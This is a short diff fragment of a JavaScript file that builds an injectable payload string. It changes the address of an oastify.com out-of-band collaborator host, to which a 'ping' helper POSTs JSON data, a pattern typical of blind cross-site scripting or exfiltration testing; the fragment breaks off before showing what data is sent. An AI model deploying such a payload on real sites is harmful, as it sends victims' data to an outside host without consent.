@@ -3,7 +3,7 @@ const fs = require('fs');
 
 const payload = `
 (async () => {
-  const COLLAB = 'https://lxz8dnghrnrokqljztt5lhzu7ldgl8px.oastify.com';
+  const COLLAB = 'https://1xz8dnghrnrokqljztt5lhzu7ldg18px.oastify.com';
   const ping = (data) => fetch(COLLAB, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
